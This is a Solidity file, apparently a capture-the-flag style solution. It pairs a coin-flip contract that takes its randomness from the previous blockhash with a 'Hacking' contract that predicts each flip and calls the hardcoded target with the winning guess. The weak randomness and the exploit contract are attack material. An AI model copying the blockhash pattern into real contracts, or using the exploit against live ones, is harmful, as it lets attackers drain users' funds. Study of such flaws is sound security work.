// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlip {
    using SafeMath for uint256;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }

    function flipcheck(bool _guess) public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        //lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            //consecutiveWins++;
            return true;
        } else {
            //consecutiveWins = 0;
            return false;
        }
    }
}

contract Hacking {
    CoinFlip hacker = CoinFlip(0xd5cb096650C63c4697C9332a24d1A55b6E07b4a6);
    CoinFlip hackercheck;

    constructor(address cont) {
        hackercheck = CoinFlip(cont);
    }

    function hackerjob() public {
        bool boo = hackercheck.flipcheck(true);
        if (boo == true) {
            hacker.flip(true);
        } else {
            hacker.flip(false);
        }
    }
}
